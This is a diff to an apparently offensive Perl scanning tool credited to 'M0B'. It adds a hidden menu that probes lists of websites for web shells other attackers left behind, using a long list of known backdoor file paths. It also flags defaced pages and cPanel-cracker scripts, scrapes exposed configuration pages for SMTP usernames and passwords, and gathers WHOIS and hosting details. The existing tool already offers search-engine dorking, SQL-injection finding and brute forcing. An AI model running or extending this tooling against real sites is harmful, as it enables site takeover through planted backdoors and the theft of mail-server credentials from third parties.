@@ -13,19 +13,21 @@
 #      Scan tool     #
 #                    #
 ######################
-####################################
-use LWP::UserAgent;  		   #
-use HTTP::Request;   		   #
-use Term::ANSIColor; 		   #
-use IO::Socket;                    #
-use IO::Socket::INET;              #
-use Term::ANSIColor;               #
-use URI::URL;                      #
-use HTTP::Cookies;                 #
-use POSIX qw(uname);		   # 
-use HTTP::Request::Common qw(POST);#
-use HTTP::Request::Common qw(GET); #
-####################################
+###############################################
+use if $^O eq "MSWin32", Win32::Console::ANSI;#
+use LWP::UserAgent;  		                  #
+use HTTP::Request;   		                  #
+use Term::ANSIColor; 		                  #
+use IO::Socket;                               #
+use IO::Socket::INET;                         #
+use Term::ANSIColor;                          #
+use URI::URL;                                 #
+use HTTP::Cookies;                            #
+use POSIX qw(uname);		                  # 
+use HTTP::Request::Common qw(POST);           #
+use HTTP::Request::Common qw(GET);            #
+use JSON qw( decode_json encode_json );       #
+###############################################
 #################################### DONT TOUCH THIS / TOUCH THIS IF YOU WANT
 ######################################################################################################
 ##################################### for search engines #############################################
@@ -56,14 +58,16 @@ $BruteForce="BruteForce";
         mkdir $BruteForce or die "Error creating directory: $BruteForce";
     }
 
-$BruteForce="BruteForce";
-    if (-e $BruteForce) 
+	$hidden="hidden";
+    if (-e $hidden) 
     {
     }
     else
     {
-        mkdir $BruteForce or die "Error creating directory: $BruteForce";
+        mkdir $hidden or die "Error creating directory: $hidden";
     }
+	
+	
 	$rez="rez";
     if (-e $rez) 
     {
@@ -118,6 +122,9 @@ if ( @uname =~ Linux ) {    #for linux os
      print " \n            created by M0B \n\n";
 	print "\n[!] Usage : perl $0 <argument>\n";
 	print "\n"; 
+	print " --other     |get second tools.\n";
+	print "-------------+-------------------------------------------------------------\n";
+	print "-------------+-------------------------------------------------------------\n";
 	print " --m         |select search engine you want.\n";
 	print "             |ex : perl $0 --m baidu ...\n";
 	print "             |or you can also use all engines\n";
@@ -170,6 +177,15 @@ sub variables
      foreach (@ARGV)
      {
 #
+sub item
+{
+    my $n = shift // '+';
+    return color('bold red')," ["
+    , color('bold green'),"$n"
+    , color('bold red'),"] "
+    , color("bold white")
+    ;
+}
 ######################## user agent
 @auser = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
 	"Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1",
@@ -280,6 +296,7 @@ $att="q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|ba
      if ($ARGV[$i] eq "--br"){$br_list = $ARGV[$i+1]}
      if ($ARGV[$i] eq "--lp"){$pass = $ARGV[$i+1]}
 	 if ($ARGV[$i] eq "--help"){$help = &help}
+	 if ($ARGV[$i] eq "--other"){$other = &other}
      $i++;
 	 }
 	 }
@@ -294,6 +311,7 @@ redork();
 sub redork {
 if (not defined($search_dork)) {
 print colored ("[+]You haven't writed dork yet!\n\n","white on_red");
+exit;
 }
 
 if ($search_motor !~ /teoma|oscobo|mywebsearch|sogou|baidu|rakuten|livedoor|bing|all/) {
@@ -750,9 +768,9 @@ open(savea, ">>$search_output");
 ######## special service ;) ########
 sub sercl {
 print "\n\n[+] Your dork scan is finished , Can AUTO-M0B help you?\n\n";
-print "[1] Do a cms scan for your list ?\n";
-print "[2] Find sql injection ?\n";
-print "[3] Leave me alone !!\n\n";
+print colored("[1] Do a cms scan for your list ?\n",'green');
+print colored("[2] Find sql injection ?\n",'green');
+print colored("[3] Leave me alone !!\n\n",'red');
 
 $number=<STDIN>;
 chomp $number;
@@ -4758,4 +4776,658 @@ print color('bold white'),"masseditproduct";
 
 print color('bold red'),"[FAILED]\n";
 }
+}
+
+
+############################
+######### OTHER :) #########
+############################
+sub other {
+if ( @uname =~ Linux ) {    #for linux os
+	 system("clear");
+	 }
+	 
+print "\n\n[+] Welcome to hidden M0B , what would you try?\n\n";
+print colored("[1] shell / cpanel cracker / hacked index finder/detecter ?\n",'green');
+print colored("[2] Find smtp from config ?\n",'green');
+print colored("[3] gather details about a website ?\n",'green');
+print colored("[4] Leave me alone !!\n\n",'red');
+
+$number=<STDIN>;
+chomp $number;
+if($number eq '1'){
+vulnfinder();
+}
+if($number eq '2'){
+getsmtp();
+exit;
+}
+if($number eq '3'){
+gatherinf();
+exit;
+}
+if($number eq '4'){
+exit;
+}
+if($number !~ /1|2|3|4/){
+print "AHO DESU KA?\n\n";
+other();
+}
+}
+
+sub vulnfinder {
+
+print "\n\n[+] Welcome to MULTI VULNERABILITIES FINDER tool , how would you find shells?\n";
+print "[+] Remarque : detecting tools may not found exactly results\n\n";
+print colored("[1] detect working shells\n",'green');
+print colored("[2] find shell link\n",'green');
+print colored("[3] detect hacked sites\n",'green');
+print colored("[4] detect cpanel cracker scripts\n",'green');
+print colored("[5] Leave\n\n",'red');
+
+$number=<STDIN>;
+chomp $number;
+if($number eq '1'){
+shelldetect();
+exit;
+}
+if($number eq '2'){
+shellfind();
+exit;
+}
+if($number eq '3'){
+detecthacked();
+exit;
+}
+if($number eq '4'){
+detectcp();
+exit;
+}
+if($number eq '5'){
+exit;
+}
+if($number !~ /1|2|3|4|5/){
+print "AHO DESU KA?\n\n";
+vulnfinder();
+}
+}
+
+sub shelldetect {
+print colored("[PUT YOUR LIST]: ",'red');
+ 
+$lista=<STDIN>;
+chomp($lista);
+print "\n";
+open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
+my @lista = <lista>;
+close lista;
+ 
+foreach $site(@lista) {
+ 
+if($site !~ /http:\/\//) { $site = "$site/"; };
+detect();
+}
+sub detect($site){
+
+my $checar = $ua->get("$site")->content;
+if($checar =~/K2LL33D SHELL|k2ll33d|uploader by ghost-dz|Upload file: [ Writeable ]|Upload Form Yunkers Crew|Mr. DellatioNx196 GaLers xh3LL Backd00r 1.0|Fallagassrini|Mister Spy Bypass Shell|bypass 1.0, Devloped By El Moujahidin|b374k|IndoXploit|Jijle3 [PHDZ]|J3Dianas/) {
+    print colored("[SHELL]: $site",'WHITE ON_CYAN'),"\n";
+open(save, '>>hidden/shell_detect.txt');
+    print save "$site\n";
+    close(save);
+}
+########################## maybe shell
+elsif($checar =~/-Ubuntu SMP|UTC 2018 x86_64|.ELK6.x86_64 #1 SMP|.el6.x86_64 #1 SMP|EDT 2018 x86_64|.el7.x86_64 #1 SMP|UTC 2016 x86_64|.el6h.x86_64 #1 SMP|EDT 2018 x86_64|#1 SMP |CDT 2018 x86_64|wp-cron.php|wp-config.php|wp-content|.ELK6.x86_64 #1 SMP|CDT 2018 x86_64|.el6h.x86_64 #1 SMP|EDT 2018 x86_64|Linux|Windows|Ubunto|Debian|#1 SMP|MSK 2018 x86_64|.hostgator.com|.bluehost.com|.justhost.com|.myserverhosts.com|.sgcentos.com|.websitewelcome.com|.secureserver.net|UTC 2015 x86_64|CDT 2016 x86_64|CST 2016 x86_64|UTC 2016 x86_64|EDT 2016 x86_64|MSK 2016|CDT 2014 x86_64|CST 2014 x86_64|UTC 2014 x86_64|EDT 2014 x86_64|MSK 2014|CDT 2015 x86_64|CST 2015 x86_64|UTC 2015 x86_64|EDT 2015 x86_64|MSK 2015|CDT 2013 x86_64|CST 2013 x86_64|UTC 2013 x86_64|EDT 2013 x86_64|MSK 2013|(Windows Server 2008 Enterprise Edition Service Pack 2)/) {
+    print colored("[MAYBE SHELL]: $site",'WHITE ON_yellow'),"\n";
+open(save, '>>hidden/maybe_shell_detect.txt');
+    print save "$site\n";
+    close(save);
+}
+else{
+   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
+   close(save);
+}
+
+}
+}
+
+sub shellfind {
+print colored("[PUT YOUR LIST]: ",'red');
+ 
+$lista=<STDIN>;
+chomp($lista);
+print "\n";
+open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
+my @lista = <lista>;
+close lista;
+ 
+foreach $site(@lista) {
+chomp($site);
+$a++;
+find();
+}
+sub find($site){
+@path = ('web.root','WSO.php','dz.php','cpanel.php','Cpanel.php','cpn.php','sql.php','mysql.php','Cgishell.pl','1.php',
+'2.php','shell.php','sh3ll.php','dz0.php','killer.php','dam.php','dom.php','user.php','users.php','whmcs.php','d0mains.php',
+'vb.php','forum.php','forums.php','wp.php','wordpress.php','joomla.php','Sym.php','cp.php','sql.php','h4xor.phpL3b.php','d.php','a.php',
+'b.php','c.php','upload.php','uploads.php','up.php','image.php','images.php',
+'sq.php','sa.php','sa2.php','gaza.php','site.php','home.php','test.php','data.php','domaine.php','domain.php','domains.php','Symlink.php','c99.php',
+'c100.php','dx.php','server.php','priv8.php','cgi.pl','Symlink.pl','root.php','404.php','roots.php','Marvins.php','Esbkdv.php','bwi.php','zumbing.php',
+'hamody.php','xd.php','shell.php','x88.php','wso.php','css/1/jou.php','FARES.php','fares.php','WSO.php','dz.php',
+'w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php',
+'config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php',
+'dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php',
+'c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php',
+'offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php',
+'tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php',
+'templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php',
+'wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
+'d0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
+'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
+'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
+'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
+'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
+'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
+'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
+'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
+'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
+'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
+'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
+'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
+'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
+'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
+'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
+'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
+'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
+'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
+'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
+'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
+'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',);
+ 
+foreach $myshell(@path){
+ 
+$shellfind = $site.'/'.$myshell;
+$req = HTTP::Request->new(GET=>$shellfind);
+$useragent = LWP::UserAgent->new();
+ 
+$response = $useragent->request($req);
+ 
+if ($response->is_success){
+print "Shell found : $shellfind\n";
+ open(save, '>>hidden/shell_find.txt');
+    print save "$shellfind\n";
+	    close(save);
+
+}else{
+print "Shell not found : $shellfind\n";
+}
+}
+}
+}
+
+sub detecthacked {
+print colored("[PUT YOUR LIST]: ",'red');
+ 
+$lista=<STDIN>;
+chomp($lista);
+print "\n";
+open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
+my @lista = <lista>;
+close lista;
+ 
+foreach $site(@lista) {
+ 
+if($site !~ /http:\/\//) { $site = "$site/"; };
+hackdetect();
+}
+sub hackdetect($site){
+
+my $checar = $ua->get("$site")->content;
+if($checar =~/HACKED BY|hacked by|Hacked|Hacked|Hacked by|0wn3d By|Security is Captured By/) {
+    print colored("[HACKED INDEX]: $site",'WHITE ON_red'),"\n";
+open(save, '>>hidden/hacked_index_detect.txt');
+    print save "$site\n";
+    close(save);
+}
+else{
+   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
+   close(save);
+}
+}
+}
+
+sub detectcp {
+print colored("[PUT YOUR LIST]: ",'red');
+ 
+$lista=<STDIN>;
+chomp($lista);
+print "\n";
+open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
+my @lista = <lista>;
+close lista;
+ 
+foreach $site(@lista) {
+ 
+if($site !~ /http:\/\//) { $site = "$site/"; };
+cpdetect();
+}
+sub cpdetect($site){
+
+my $checar = $ua->get("$site")->content;
+if($checar =~/1337w0rm|cPanel Cracker|Automatic cPanel Finder|cpanel cracker 3xp1r3 cyber army|cpanel|cpanel finder/) {
+    print colored("[CPANEL CRACKER]: $site",'WHITE ON_purple'),"\n";
+open(save, '>>hidden/cpanel_detect.txt');
+    print save "$site\n";
+    close(save);
+}
+else{
+   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
+   close(save);
+}
+}
+}
+
+sub getsmtp {
+print "List : \n";
+$list=<STDIN>;
+open(tarrget,"<$list") or die "[LIST NOT FOUND] \n";
+while(<tarrget>){
+chomp($_);
+$site = $_;
+if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
+smtpfind();
+
+
+}
+}
+sub smtpfind(){
+my $cont = $ua->get("$site")->content;
+print "\n";
+print item('+'),"$site";
+if ($cont =~ /smtpuser = \'(.*?)\';/){
+        print "\t SMTP User = $1 \n";
+        open (TEXT, '>>hidden/smtp.txt');
+        print TEXT " SMTP INFO\n SMTP User = $1\n";
+        close (TEXT);
+  }
+        if ($cont =~ /smtppass = \'(.*?)\';/){
+        print "\t SMTP Password = $1 \n";
+        open (TEXT, '>>hidden/smtp.txt');
+        print TEXT " SMTP Password = $1\n";
+        close (TEXT);
+  }
+        if ($cont =~ /smtpport = \'(.*?)\';/){
+        print "\t SMTP Port = $1 \n";
+        open (TEXT, '>>hidden/smtp.txt');
+        print TEXT "SMTP Port = $1\n";
+        close (TEXT);
+  }
+        if ($cont =~ /smtphost = \'(.*?)\';/){
+        print "\t SMTP Host = $1 \n\n";
+        open (TEXT, '>>hidden/smtp.txt');
+        print TEXT "SMTP Host = $1\n";
+        close (TEXT);
+  
+}
+else{         
+print colored("[FAILED]",'red');
+print "\n";
+
+    }
+
+}
+
+sub gatherinf {
+print item('+'),"Website : ";
+chomp($site=<STDIN>);
+webinf();
+serverip();
+domainwhoislookup();
+weblocation();
+subdomain();
+}
+
+sub webinf {
+    $url = "https://myip.ms/$site";
+    $request = $ua->get($url);
+    $response = $request->content;
+
+    if($response =~/> (.*?) visitors per day </)
+    {
+        print item(),"Hosting Info for Website: $site\n";
+        print item(),"Visitors per day: $1 \n";
+
+        if($response =~/> (.*?) visitors per day on (.*?)</){
+            print item(),"Visitors per day: $1 \n";
+        }
+        $ip= (gethostbyname($site))[4];
+        my ($a,$b,$c,$d) = unpack('C4',$ip);
+        $ip_address ="$a.$b.$c.$d";
+        print item(),"IP Address: $ip_address\n";
+
+        if($response =~/IPv6.png'><a href='\/info\/whois6\/(.*?)'>/)
+        {
+            $ipv6_address=$1;
+            print item(),"Linked IPv6 Address: $ipv6_address\n";
+        }
+        if($response =~/IP Location: <\/td> <td class='vmiddle'><span class='cflag (.*?)'><\/span><a href='\/view\/countries\/(.*?)\/Internet_Usage_Statistics_(.*?).html'>(.*?)<\/a>/)
+        {
+            $Location=$1;
+            print item(),"IP Location: $Location\n";
+        }
+        if($response =~/IP Reverse DNS (.*?)<\/b><\/div><div class='sval'>(.*?)<\/div>/)
+        {
+            $host=$2;
+            print item(),"IP Reverse DNS (Host): $host\n";
+        }
+        if($response =~/Hosting Company: <\/td><td valign='middle' class='bold'> <span class='nounderline'><a title='(.*?)'/)
+        {
+            $ownerName=$1;
+            print item(),"Hosting Company: $ownerName\n";
+        }
+        if($response =~/Hosting Company \/ IP Owner: <\/td><td valign='middle' class='bold'>  <span class='cflag (.*?)'><\/span> <a href='\/view\/web_hosting\/(.*?)'>(.*?)<\/a>/)
+        {
+            $ownerip=$3;
+            print item(),"Hosting Company IP Owner:  $ownerip\n";
+        }
+        if($response =~/Hosting Company \/ IP Owner: <\/td><td valign='middle' class='bold'> <span class='nounderline'><a title='(.*?)'/)
+        {
+            $ownerip=$1;
+            print item(),"Hosting Company IP Owner:  $ownerip\n";
+        }
+        if($response =~/IP Range <b>(.*?) - (.*?)<\/b><br>have <b>(.*?)<\/b>/)
+        {
+            print item(),"Hosting IP Range: $1 - $2 ($3 ip) \n";
+        }
+        if($response =~/Hosting Address: <\/td><td>(.*?)<\/td><\/tr>/)
+        {
+            $address=$1;
+            print item(),"Hosting Address: $address\n";
+        }
+        if($response =~/Owner Address: <\/td><td>(.*?)<\/td>/)
+        {
+            $addressowner=$1;
+            print item(),"Owner Address: $addressowner\n";
+        }
+        if($response =~/Hosting Country: <\/td><td><span class='cflag (.*?)'><\/span><a href='\/view\/countries\/(.*?)\/(.*?)'>(.*?)<\/a>/)
+        {
+            $HostingCountry=$1;
+            print item(),"Hosting Country: $HostingCountry\n";
+        }
+        if($response =~/Owner Country: <\/td><td><span class='cflag (.*?)'><\/span><a href='\/view\/countries\/(.*?)\/(.*?)'>(.*?)<\/a>/)
+        {
+            $OwnerCountry=$1;
+            print item(),"Owner Country: $OwnerCountry\n";
+        }
+        if($response =~/Hosting Phone: <\/td><td>(.*?)<\/td><\/tr>/)
+        {
+            $phone=$1;
+            print item(),"Hosting Phone: $phone\n";
+        }
+        if($response =~/Owner Phone: <\/td><td>(.*?)<\/td><\/tr>/)
+        {
+            $Ownerphone=$1;
+            print item(),"Owner Phone: $Ownerphone\n";
+        }
+        if($response =~/Hosting Website: <img class='cursor-help noprint left10' border='0' width='12' height='10' src='\/images\/tooltip.gif'><\/td><td><a href='\/(.*?)'>(.*?)<\/a><\/td>/)
+        {
+            $website=$1;
+            print item(),"Hosting Website: $website\n";
+        }
+        if($response =~/Owner Website: <img class='cursor-help noprint left10' border='0' width='12' height='10' src='\/(.*?)'><\/td><td><a href='\/(.*?)'>(.*?)<\/a>/)
+        {
+            $Ownerwebsite=$3;
+            print item(),"Owner Website: $Ownerwebsite\n";
+        }
+        if($response =~/CIDR:<\/td><td> (.*?)<\/td><\/tr>/)
+        {
+            $CIDR=$1;
+            print item(),"CIDR: $CIDR\n";
+        }
+        if($response =~/Owner CIDR: <\/td><td><span class='(.*?)'><a href="\/view\/ip_addresses\/(.*?)">(.*?)<\/a>\/(.*?)<\/span><\/td><\/tr>/)
+        {
+            print item(),"Owner CIDR: $3/$4\n\n";
+        }
+        if($response =~/Hosting CIDR: <\/td><td><span class='(.*?)'><a href="\/view\/ip_addresses\/(.*?)">(.*?)<\/a>\/(.*?)<\/span><\/td><\/tr>/)
+        {
+            print item(),"Hosting CIDR: $3/$4\n\n";
+        }
+        $url = "https://dns-api.org/NS/$site";
+        $request = $ua->get($url);
+        $response = $request->content;
+    }else {
+        print item(),"There Is A Problem\n\n";
+        print item('1'),"Checking The Connection\n";
+        print item('2'),"Enter Website Without HTTP/HTTPs\n";
+        print item('3'),"Check If Website Working\n";
+    }
+    my %seen;
+    while($response =~m/value":"(.*?)."/g)
+    {
+        $ns=$1;
+        next if $seen{$ns}++;
+        print item(),"NS: $ns \n";
+    }
+}
+
+sub serverip {
+    $ua = LWP::UserAgent->new(keep_alive => 1);
+    $ua->agent("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0");
+    my $url = "https://dns-api.org/MX/$site";
+
+    $request = $ua->get($url);
+    $response = $request->content;
+    if ($response =~ /error/){
+        print item(),"There Is A Problem\n\n";
+        print item('1'),"Checking The Connection\n";
+        print item('2'),"Enter Website Without HTTP/HTTPs\n";
+        print item('3'),"Check If Website Working\n";
+        exit
+    }
+    print item(),"Domain name for MX records: $site\n\n";
+    my %seen;
+    while($response =~m/value":"(.*?) (.*?)."/g)
+    {
+        $mx=$2;
+        next if $seen{$mx}++;
+        print item(),"$mx -- priority $1\n";
+    }
+}
+
+sub domainwhoislookup {
+    $url = "https://pastebin.com/raw/YfHdX0jE";
+    $request = $ua->get($url);
+    $api4 = $request->content;
+    $url = "http://www.whoisxmlapi.com//whoisserver/WhoisService?domainName=$site&username=$api4&outputFormat=JSON";
+    $request = $ua->get($url);
+    $response = $request->content;
+
+    my $responseObject = decode_json($response);
+
+    if (exists $responseObject->{'WhoisRecord'}->{'createdDate'}){
+        print item(),"Whois lookup for : $site \n";
+        print item(),'Created date: ',
+        $responseObject->{'WhoisRecord'}->{'createdDate'},"\n";sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'expiresDate'}){
+            print item(),'Expires date: ',
+            $responseObject->{'WhoisRecord'}->{'expiresDate'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'contactEmail'}){
+            print item(),'Contact email: ',
+            $responseObject->{'WhoisRecord'}->{'contactEmail'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'name'}){
+            print item(),'Registrant Name: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'name'},"\n";} sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'organization'}){
+            print item(),'Registrant Organization: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'organization'},"\n";} sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'street1'}){
+            print item(),'Registrant Street: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'street1'},"\n";} sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'city'}){
+            print item(),'Registrant City: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'city'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'state'}){
+            print item(),'Registrant State/Province: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'state'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'postalCode'}){
+            print item(),'Registrant Postal Code: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'postalCode'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'country'}){
+            print item(),'Registrant Country: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'country'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'email'}){
+            print item(),'Registrant Email: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'email'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'telephone'}){
+            print item(),'Registrant Phone: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'telephone'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'registrant'}->{'fax'}){
+            print item(),'Registrant Fax: ',
+            $responseObject->{'WhoisRecord'}->{'registrant'}->{'fax'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'name'}){
+            print item(),'Admin Name: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'name'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'organization'}){
+            print item(),'Admin Organization: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'organization'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'street1'}){
+            print item(),'Admin Street: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'street1'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'city'}){
+            print item(),'Admin City: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'city'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'state'}){
+            print item(),'Admin State/Province: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'state'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'postalCode'}){
+            print item(),'Admin Postal Code: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'postalCode'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'country'}){
+            print item(),'Admin Country: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'country'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'email'}){
+            print item(),'Admin Email: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'email'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'telephone'}){
+            print item(),'Admin Phone: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'telephone'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'fax'}){
+            print item(),'Admin Fax: ',
+            $responseObject->{'WhoisRecord'}->{'administrativeContact'}->{'fax'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'name'}){
+            print item(),'Tech Name: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'name'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'organization'}){
+            print item(),'Tech Organization: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'organization'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'street1'}){
+            print item(),'Tech Street: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'street1'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'city'}){
+            print item(),'Tech City: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'city'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'state'}){
+            print item(),'Tech State/Province: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'state'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'postalCode'}){
+            print item(),'Tech Postal Code: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'postalCode'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'country'}){
+            print item(),'Tech Country: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'country'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'email'}){
+            print item(),'Tech Email: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'email'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'telephone'}){
+            print item(),'Tech Phone: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'telephone'},"\n";}sleep(1);
+        if (exists $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'fax'}){
+            print item(),'Tech Fax: ',
+            $responseObject->{'WhoisRecord'}->{'technicalContact'}->{'fax'},"\n";}sleep(1);
+    }else {
+        print item(),"There Is A Problem\n\n";
+        print item('1'),"Checking The Connection\n";
+        print item('2'),"Enter Website Without HTTP/HTTPs\n";
+        print item('3'),"Check If Website Working\n";
+    }
+}
+
+sub weblocation {
+    $ip= (gethostbyname($site))[4];
+    my ($a,$b,$c,$d) = unpack('C4',$ip);
+    $ip ="$a.$b.$c.$d";
+
+    $url = "https://ipapi.co/$ip/json/";
+    $request = $ua->get($url);
+    $response = $request->content;
+
+    if($response =~/country_name": "(.*?)"/){
+        print item(),"IP Address: $ip\n";
+        print item(),"Country: $1\n";
+        if($response =~/city": "(.*?)"/){
+            print item(),"City: $1\n";
